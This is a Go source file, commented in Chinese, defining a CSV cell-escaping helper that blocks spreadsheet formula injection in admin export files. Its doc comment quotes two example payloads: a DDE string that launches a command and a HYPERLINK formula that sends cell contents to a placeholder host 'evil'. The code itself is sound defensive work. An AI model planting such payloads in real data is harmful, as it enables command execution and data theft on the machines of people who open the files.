// Package csvsafe 是 qianye 扩展**唯一**的 CSV 单元格转义实现。
//
// 存在理由:本仓有三份管理端 CSV 导出(违规记录、邀请日消费、分组矩阵孤儿),
// 三份都写 UTF-8 BOM,因为它们的唯一用途就是"运营用 Excel / WPS 打开"。而这三份
// 里的用户名、令牌名、邮箱、分组名、命中词全部来自用户输入 —— 于是"用 Excel 打开"
// 这个动作本身就是攻击面(CSV 注入)。
//
// 判据只有一条:凡是**可能来自用户输入**的字符串列,都必须过 Cell。数字列
// (strconv.Format*)与代码里的字面量常量不需要。
//
// 各模块各写一份是这套东西上一次出问题的形状:违规导出写了护栏,另外两份没写,
// 而三份的攻击面逐字相同。放在这里而不是某个模块里,是因为它不属于任何一个业务模块;
// 放在 httpq 里也不合适 —— 那个包的包注释写明了它只管请求侧的查询参数解析。
package csvsafe

import "strings"

var flatten = strings.NewReplacer("\r\n", " ", "\n", " ", "\r", " ", "\t", " ")

// Cell 让一个单元格在电子表格里只能是文本,不可能是公式。
//
// Excel / WPS / Sheets 会把以 `=` `+` `-` `@` 开头的单元格当公式求值,于是一个
// 注册时就叫 `=cmd|'/c calc'!A1` 的用户名(17 字,用户名上限 20)、或者一个叫
// `=HYPERLINK("http://evil/"&A1,"x")` 的令牌名,就变成了打开这份 CSV 的运营机器上的
// 一次命令执行或一次数据外带。前缀一个单引号是各家电子表格通用的"强制文本"写法,
// 而 csv.Writer 只负责逗号与引号的转义,管不到这一层。
//
// 制表符与换行同时压平:它们不造成安全问题,但会让一行记录在表格里裂成几行,
// 而"一行 = 一条记录"是这几份文件唯一的阅读约定。
func Cell(s string) string {
	s = flatten.Replace(s)
	if s == "" {
		return s
	}
	switch s[0] {
	case '=', '+', '-', '@':
		return "'" + s
	}
	return s
}
